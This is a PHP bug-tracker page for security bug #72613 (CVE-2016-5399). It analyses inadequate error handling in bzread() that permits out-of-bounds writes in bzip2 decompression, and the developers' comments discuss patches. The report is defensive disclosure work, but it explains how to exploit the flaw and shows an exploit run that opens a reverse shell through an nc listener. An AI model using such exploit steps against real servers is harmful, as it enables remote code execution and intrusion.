<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    
        <link rel='alternate' type='application/rss+xml' title='Bzip2 Related Bug #72613 - RDF' href='rss/bug.php?id=72613'>
        <link rel='alternate' type='application/rss+xml' title='Bzip2 Related Bug #72613 - RSS 2.0' href='rss/bug.php?id=72613&format=rss2'>
        <base href="https://bugs.php.net/">
    <title>PHP :: Sec Bug #72613 :: Inadequate error handling in bzread()</title>
    <link rel="shortcut icon" href="https://bugs.php.net/images/favicon.ico">
    <link rel="stylesheet" href="https://bugs.php.net/css/style.css">
</head>

<body>

<table id="top" class="head" cellspacing="0" cellpadding="0">
    <tr>
        <td class="head-logo">
            <a href="/"><img src="images/logo.png" alt="Bugs" vspace="2" hspace="2"></a>
        </td>

        <td class="head-menu">
            <a href="https://php.net/">php.net</a>&nbsp;|&nbsp;
            <a href="https://php.net/support.php">support</a>&nbsp;|&nbsp;
            <a href="https://php.net/docs.php">documentation</a>&nbsp;|&nbsp;
            <a href="report.php">report a bug</a>&nbsp;|&nbsp;
            <a href="search.php">advanced search</a>&nbsp;|&nbsp;
            <a href="search-howto.php">search howto</a>&nbsp;|&nbsp;
            <a href="stats.php">statistics</a>&nbsp;|&nbsp;
            <a href="random">random bug</a>&nbsp;|&nbsp;
            <a href="login.php">login</a>
        </td>
    </tr>

    <tr>
        <td class="head-search" colspan="2">
            <form method="get" action="search.php">
                <p class="head-search">
                    <input type="hidden" name="cmd" value="display">
                    <small>go to bug id or search bugs for</small>
                    <input class="small" type="text" name="search_for" value="" size="30">
                    <input type="image" src="images/small_submit_white.gif" alt="search" style="vertical-align: middle;">
                </p>
            </form>
        </td>
    </tr>
</table>

<table class="middle" cellspacing="0" cellpadding="0">
    <tr>
        <td class="content">
<div id="bugheader">
    <table id="details">
        <tr id="title">
            <th class="details" id="number"><a href="bug.php?id=72613">Sec Bug</a>&nbsp;#72613</th>
            <td id="summary" colspan="5">Inadequate error handling in bzread()</td>
        </tr>
        <tr id="submission">
            <th class="details">Submitted:</th>
            <td style="white-space: nowrap;">2016-07-18 03:43 UTC</td>
            <th class="details">Modified:</th>
            <td style="white-space: nowrap;">2016-07-24 07:53 UTC</td>
            <td rowspan="6">


            </td>
        </tr>

        <tr id="submitter">
            <th class="details">From:</th>
            <td>hji &#x61;&#116; dyntopia &#x64;&#111;&#x74; com</td>
            <th class="details">Assigned:</th>
            <td><a href="search.php?cmd=display&amp;assign=stas">stas</a> (<a href="https://people.php.net/stas">profile</a>)</td>
        </tr>

        <tr id="categorization">
            <th class="details">Status:</th>
            <td>Closed</td>
            <th class="details">Package:</th>
            <td><a href="search.php?cmd=display&amp;package_name[]=Bzip2+Related">Bzip2 Related</a></td>
        </tr>

        <tr id="situation">
            <th class="details">PHP Version:</th>
            <td>5.5.37</td>
            <th class="details">OS:</th>
            <td></td>
        </tr>

        <tr id="private">
            <th class="details">Private report:</th>
            <td>No</td>
            <th class="details">CVE-ID:</th>
            <td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5399" target="_blank">2016-5399</a></td>
        </tr>
    </table>
</div>

<div class="controls">
<span id='control_0' class='control active'>View</span>
<span id='control_3' class='control'><a href='bug.php?id=72613&amp;edit=3'>Add Comment</a></span>
<span id='control_1' class='control'><a href='bug.php?id=72613&amp;edit=1'>Developer</a></span>
<span id='control_2' class='control'><a href='bug.php?id=72613&amp;edit=2'>Edit</a></span>
</div>
<div class="clear"></div>



<div class='comment type_comment' ><a name="1468813384">&nbsp;</a><strong>[2016-07-18 03:43 UTC] hji &#x61;&#116; dyntopia &#x64;&#111;&#x74; com</strong>
<pre class='note'>Description:
------------
PHP 7.0.8, 5.6.23 and 5.5.37 does not perform adequate error handling in
its `bzread()' function:

php-7.0.8/ext/bz2/bz2.c
,----
| 364 static PHP_FUNCTION(bzread)
| 365 {
| ...
| 382     ZSTR_LEN(data) = php_stream_read(stream, ZSTR_VAL(data), ZSTR_LEN(data));
| 383     ZSTR_VAL(data)[ZSTR_LEN(data)] = '\0';
| 384
| 385     RETURN_NEW_STR(data);
| 386 }
`----

php-7.0.8/ext/bz2/bz2.c
,----
| 210 php_stream_ops php_stream_bz2io_ops = {
| 211     php_bz2iop_write, php_bz2iop_read,
| 212     php_bz2iop_close, php_bz2iop_flush,
| 213     &quot;BZip2&quot;,
| 214     NULL, /* seek */
| 215     NULL, /* cast */
| 216     NULL, /* stat */
| 217     NULL  /* set_option */
| 218 };
`----

php-7.0.8/ext/bz2/bz2.c
,----
| 136 /* {{{ BZip2 stream implementation */
| 137
| 138 static size_t php_bz2iop_read(php_stream *stream, char *buf, size_t count)
| 139 {
| 140     struct php_bz2_stream_data_t *self = (struct php_bz2_stream_data_t *)stream-&gt;abstract;
| 141     size_t ret = 0;
| 142
| 143     do {
| 144         int just_read;
| ...
| 148         just_read = BZ2_bzread(self-&gt;bz_file, buf, to_read);
| 149
| 150         if (just_read &lt; 1) {
| 151             stream-&gt;eof = 0 == just_read;
| 152             break;
| 153         }
| 154
| 155         ret += just_read;
| 156     } while (ret &lt; count);
| 157
| 158     return ret;
| 159 }
`----

The erroneous return values for Bzip2 are as follows:

bzip2-1.0.6/bzlib.h
,----
| 038 #define BZ_SEQUENCE_ERROR    (-1)
| 039 #define BZ_PARAM_ERROR       (-2)
| 040 #define BZ_MEM_ERROR         (-3)
| 041 #define BZ_DATA_ERROR        (-4)
| 042 #define BZ_DATA_ERROR_MAGIC  (-5)
| 043 #define BZ_IO_ERROR          (-6)
| 044 #define BZ_UNEXPECTED_EOF    (-7)
| 045 #define BZ_OUTBUFF_FULL      (-8)
| 046 #define BZ_CONFIG_ERROR      (-9)
`----

Should the invocation of BZ2_bzread() fail, the loop would simply be
broken out of (bz2.c:152) and execution would continue with bzread()
returning RETURN_NEW_STR(data).

According to the manual[1], bzread() returns FALSE on error; however
that does not seem to ever happen.

Due to the way that the bzip2 library deals with state, this could
result in an exploitable condition if a user were to call bzread() after
an error, eg:

,----
| $data = &quot;&quot;;
| while (!feof($fp)) {
|     $res = bzread($fp);
|     if ($res === FALSE) {
|         exit(&quot;ERROR: bzread()&quot;);
|     }
|     $data .= $res;
| }
`----


Exploitation
============

One way the lack of error-checking could be abused is through
out-of-bound writes that may occur when `BZ2_decompress()' (BZ2_bzread()
-&gt; BZ2_bzRead() -&gt; BZ2_bzDecompress() -&gt; BZ2_decompress()) processes the
`pos' array using user-controlled selectors as indices:

bzip2-1.0.6/decompress.c
,----
| 106 Int32 BZ2_decompress ( DState* s )
| 107 {
| 108    UChar      uc;
| 109    Int32      retVal;
| ...
| 113    /* stuff that needs to be saved/restored */
| 114    Int32  i;
| 115    Int32  j;
| ...
| 118    Int32  nGroups;
| 119    Int32  nSelectors;
| ...
| 167    /*restore from the save area*/
| 168    i           = s-&gt;save_i;
| 169    j           = s-&gt;save_j;
| ...
| 172    nGroups     = s-&gt;save_nGroups;
| 173    nSelectors  = s-&gt;save_nSelectors;
| ...
| 195    switch (s-&gt;state) {
| ...
| 286       /*--- Now the selectors ---*/
| 287       GET_BITS(BZ_X_SELECTOR_1, nGroups, 3);
| 288       if (nGroups &lt; 2 || nGroups &gt; 6) RETURN(BZ_DATA_ERROR);
| 289       GET_BITS(BZ_X_SELECTOR_2, nSelectors, 15);
| 290       if (nSelectors &lt; 1) RETURN(BZ_DATA_ERROR);
| 291       for (i = 0; i &lt; nSelectors; i++) {
| 292          j = 0;
| 293          while (True) {
| 294             GET_BIT(BZ_X_SELECTOR_3, uc);
| 295             if (uc == 0) break;
| 296             j++;
| 297             if (j &gt;= nGroups) RETURN(BZ_DATA_ERROR);
| 298          }
| 299          s-&gt;selectorMtf[i] = j;
| 300       }
| 301
| 302       /*--- Undo the MTF values for the selectors. ---*/
| 303       {
| 304          UChar pos[BZ_N_GROUPS], tmp, v;
| 305          for (v = 0; v &lt; nGroups; v++) pos[v] = v;
| 306
| 307          for (i = 0; i &lt; nSelectors; i++) {
| 308             v = s-&gt;selectorMtf[i];
| 309             tmp = pos[v];
| 310             while (v &gt; 0) { pos[v] = pos[v-1]; v--; }
| 311             pos[0] = tmp;
| 312             s-&gt;selector[i] = tmp;
| 313          }
| 314       }
| 315
| ...
| 613    save_state_and_return:
| 614
| 615    s-&gt;save_i           = i;
| 616    s-&gt;save_j           = j;
| ...
| 619    s-&gt;save_nGroups     = nGroups;
| 620    s-&gt;save_nSelectors  = nSelectors;
| ...
| 640    return retVal;
| 641 }
`----

bzip2-1.0.6/decompress.c
,----
| 070 #define GET_BIT(lll,uuu)                          \
| 071    GET_BITS(lll,uuu,1)
`----

bzip2-1.0.6/decompress.c
,----
| 043 #define GET_BITS(lll,vvv,nnn)                     \
| 044    case lll: s-&gt;state = lll;                      \
| 045    while (True) {                                 \
| ...
| 065    }
`----

If j &gt;= nGroups (decompress.c:297), BZ2_decompress() would save its
state and return BZ_DATA_ERROR.  If the caller don't act on the
erroneous retval, but rather invokes BZ2_decompress() again, the saved
state would be restored (including `i' and `j') and the switch statement
would transfer execution to the BZ_X_SELECTOR_3 case -- ie. the
preceding initialization of `i = 0' and `j = 0' would not be executed.

In pseudocode it could be read as something like:

,----
| i = s-&gt;save_i;
| j = s-&gt;save_j;
| 
| switch (s-&gt;state) {
| case BZ_X_SELECTOR_2:
|     s-&gt;state = BZ_X_SELECTOR_2;
| 
|     nSelectors = get_15_bits...
| 
|     for (i = 0; i &lt; nSelectors; i++) {
|         j = 0;
|         while (True) {
|             goto iter;
| case BZ_X_SELECTOR_3:
| iter:
|     s-&gt;state = BZ_X_SELECTOR_3;
| 
|     uc = get_1_bit...
| 
|     if (uc == 0) goto done;
|     j++;
|     if (j &gt;= nGroups) {
|         retVal = BZ_DATA_ERROR;
|         goto save_state_and_return;
|     }
|     goto iter;
| done:
|     s-&gt;selectorMtf[i] = j;
`----

An example selector with nGroup=6:
,----
| 11111111111110
| ||||| `|||||| `- goto done; s-&gt;selectorMtf[i] = 13;
|  `´     j++;
| j++;    goto save_state_and_return;
| goto iter;
`----

Since the selectors are used as indices to `pos' in the subsequent loop,
an `nSelectors' amount of &lt;= 255 - BZ_N_GROUPS bytes out-of-bound writes
may occur if BZ2_decompress() is invoked in spite of a previous error.

bzip2-1.0.6/decompress.c
,----
| 304          UChar pos[BZ_N_GROUPS], tmp, v;
| 305          for (v = 0; v &lt; nGroups; v++) pos[v] = v;
| 306
| 307          for (i = 0; i &lt; nSelectors; i++) {
| 308             v = s-&gt;selectorMtf[i];
| 309             tmp = pos[v];
| 310             while (v &gt; 0) { pos[v] = pos[v-1]; v--; }
| 311             pos[0] = tmp;
| 312             s-&gt;selector[i] = tmp;
| 313          }
`----

bzip2-1.0.6/bzlib_private.h
,----
| 121 #define BZ_N_GROUPS 6
`----


[1] [<a href="https://secure.php.net/manual/en/function.bzread.php]" rel="nofollow">https://secure.php.net/manual/en/function.bzread.php]</a> 


Test script:
---------------
upload.php: <a href="https://gist.github.com/dyntopia/e52eaa0b10aec1a2a600558413474325" rel="nofollow">https://gist.github.com/dyntopia/e52eaa0b10aec1a2a600558413474325</a>
CVE-2016-5399.py: <a href="https://gist.github.com/dyntopia/d01e63246a31a54300742c0ad044ee07" rel="nofollow">https://gist.github.com/dyntopia/d01e63246a31a54300742c0ad044ee07</a>

Actual result:
--------------
Against FreeBSD 10.3 amd64 with php-fpm 7.0.8 and nginx from the
official repo:

,----
| $ nc -v -l 1.2.3.4 5555 &amp;
| Listening on [1.2.3.4] (family 0, port 5555)
| 
| $ python exploit.py --ip 1.2.3.4 --port 5555 <a href="http://target/upload.php" rel="nofollow">http://target/upload.php</a>
| [*] sending archive to <a href="http://target/upload.php" rel="nofollow">http://target/upload.php</a> (0)
| 
| Connection from [target] port 5555 [tcp/*] accepted (family 2, sport 49479)
| $ fg
| id
| uid=80(www) gid=80(www) groups=80(www)
| 
| uname -imrsU
| FreeBSD 10.3-RELEASE-p4 amd64 GENERIC 1003000
| 
| /usr/sbin/pkg query -g &quot;=&gt; %n-%v&quot; php*
| =&gt; php70-7.0.8
| =&gt; php70-bz2-7.0.8
`----


This issue has been assigned CVE-2016-5399.


-- Hans Jerry Illikainen


</pre>
</div><h2>Patches</h2>
<p><a href='patch-add.php?bug_id=72613'>Add a Patch</a></p><h2>Pull Requests</h2>
<p><a href='gh-pull-add.php?bug_id=72613'>Add a Pull Request</a></p><h2 style="border-bottom:2px solid #666;margin-bottom:0;padding:5px 0;">History</h2><div id='comment_filter' class='controls comments'><span id='type_all' class='control active' onclick='do_comment(this);'>All</span><span id='type_comment' class='control ' onclick='do_comment(this);'>Comments</span><span id='type_log' class='control ' onclick='do_comment(this);'>Changes</span><span id='type_svn' class='control ' onclick='do_comment(this);'>Git/SVN commits</span><span id='type_related' class='control ' onclick='do_comment(this);'>Related reports</span>            </div>
            <div id='comments_view' style='clear:both;'>
<div class='comment type_comment' ><a name="1468904295">&nbsp;</a><strong>[2016-07-19 04:58 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>This seems to be a problem in bzip2 library if reading after error leads to an exploitable memory overwrite. The user code may as well omit checking the error by mistake and try to read again, and at this point PHP has no idea what's up in the guts of bzip2, so how would we prevent problems in such scenario?

It is true that bzread should return false on error, that should be fixed. But the larger problem of bzip2 library having hidden error state which leads to memory errors remains.
</pre>
</div><div class='comment type_log' ><a name="1468906020">&nbsp;</a><strong>[2016-07-19 05:27 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-PHP Version: 7.0.8</span>
<span class="added">+PHP Version: 5.5.37</span>
</div></div></div><div class='comment type_comment' ><a name="1468906020">&nbsp;</a><strong>[2016-07-19 05:27 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>The problem exists in 5.5 too, though the failure is different - it just ignores negative returns from bz2_ret and thinks it's a huge read after converting it to size_t. Partial fix for 5.5 in f3feddb5b45b5abd93abb1a95044b7e099d51c84
</pre>
</div><div class='comment type_log' ><a name="1468908260">&nbsp;</a><strong>[2016-07-19 06:04 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Assigned To:</span>
<span class="added">+Assigned To: stas</span>
</div></div></div><div class='comment type_comment' ><a name="1468908260">&nbsp;</a><strong>[2016-07-19 06:04 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Fix for 7.x in <a href="https://gist.github.com/ad5580eb30b139384ec7dba4d8283f60" rel="nofollow">https://gist.github.com/ad5580eb30b139384ec7dba4d8283f60</a>
 and in security repo as 5faa15c4ce9d68a286a9ffe10ecbb897ebe95601

Please verify.
More comprehensive fix will need some refactoring of streams, as currently there's no way to return errors from handlers there properly as far as I can see.
</pre>
</div><div class='comment type_log' ><a name="1468914893">&nbsp;</a><strong>[2016-07-19 07:54 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Status: Assigned</span>
<span class="added">+Status: Closed</span>
</div></div></div><div class='comment type_comment' ><a name="1468914893">&nbsp;</a><strong>[2016-07-19 07:54 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>The fix for this bug has been committed.

Snapshots of the sources are packaged every three hours; this change
will be in the next snapshot. You can grab the snapshot at
<a href="http://snaps.php.net/" rel="nofollow">http://snaps.php.net/</a>.

 For Windows:

<a href="http://windows.php.net/snapshots/" rel="nofollow">http://windows.php.net/snapshots/</a>
 
Thank you for the report, and for helping us make PHP better.


</pre>
</div><div class='comment type_comment' ><a name="1468940617">&nbsp;</a><strong>[2016-07-19 15:03 UTC] hji &#x61;&#116; dyntopia &#x64;&#111;&#x74; com</strong>
<pre class='note'>The patch fixes the issue so long as the user invokes feof() on the
bzhandle.  However, if one does not do that the corruption could still
occur.

I don't think this issue should be attributed to the bzip2 library
since it *does* emit errors as appropriate.  It only becomes a problem
if the caller don't act on erroneous conditions -- eg. a high-level
language exposing bzip2 functionality to a user.

One solution may be to do what Python does with bzip2 errors and throw
an exception (see catch_bz2_error() in _bz2module.c).
</pre>
</div><div class='comment type_comment' ><a name="1468945402">&nbsp;</a><strong>[2016-07-19 16:23 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>PHP never throws an exception on unexceptional condition like read error - fread doesn't do it, neither do any other file functions. To make bzread do it because underlying library has bad API that crashes if called after an error is not a good idea IMO.
</pre>
</div><div class='comment type_log' ><a name="1469346793">&nbsp;</a><strong>[2016-07-24 07:53 UTC] <a href="//people.php.net/kaplan">kaplan@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-CVE-ID:</span>
<span class="added">+CVE-ID: 2016-5399</span>
</div></div></div><div class='comment type_comment' ><a name="1470132598">&nbsp;</a><strong>[2016-08-02 10:09 UTC] <a href="//people.php.net/huzaifas">huzaifas@php.net</a></strong>
<pre class='note'>I dont like the patch (<a href="http://git.php.net/?p=php-src.git;a=commit;h=f3feddb5b45b5abd93abb1a95044b7e099d51c84" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=f3feddb5b45b5abd93abb1a95044b7e099d51c84</a>)  because it still does not follow what upstream bzip API guide (<a href="http://www.bzip.org/1.0.5/bzip2-manual-1.0.5.html#bzread" rel="nofollow">http://www.bzip.org/1.0.5/bzip2-manual-1.0.5.html#bzread</a>) suggests:

BZ2_bzRead will supply len bytes, unless the logical stream end is detected or an error occurs. Because of this, it is possible to detect the stream end by observing when the number of bytes returned is less than the number requested. Nevertheless, this is regarded as inadvisable; you should instead check bzerror after every call and watch out for BZ_STREAM_END.

So the patch should basically called BZ2_bzRead(), then immediately check bzerror, if no error code is set and then any other processing can be done, in case an error code then EOF is immediately returned.

Here we assume that the user always checks the output of bzread with EOF and exits when feof returns true.
</pre>
</div></div>
        </td>
    </tr>
</table>

<script src='js/util.js'></script>
<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js'></script>
<script src="js/jquery.cookie.js"></script>
<script>
function do_comment(nd)
{
    $('#comment_filter > .control.active').removeClass("active");
    $(nd).addClass("active");

    $.cookie('history_tab', nd.id, { expires: 365 });

    if (nd.id == 'type_all') {
        $('#comments_view > .comment:hidden').show('slow');
    } else {
        $('#comments_view > .comment').each(function(i) {
            if ($(this).hasClass(nd.id)) {
                $(this).show('slow');
            } else {
                $(this).hide('slow');
            }
        });
    }
    return false;
}
</script>
<table class="foot" cellspacing="0" cellpadding="0">
    <tr>
        <td class="foot-bar" colspan="2">&nbsp;</td>
    </tr>

    <tr>
        <td class="foot-copy">
            <small>
                <a href="https://php.net/"><img src="images/logo-small.gif" align="left" valign="middle" hspace="3" alt="PHP"></a>
                <a href="https://php.net/copyright.php">Copyright &copy; 2001-2021 The PHP Group</a><br>
                All rights reserved.
            </small>
        </td>
        <td class="foot-source">
            <small>Last updated: Sat Oct 30 19:03:34 2021 UTC</small>
        </td>
    </tr>
</table>
</body>
</html>
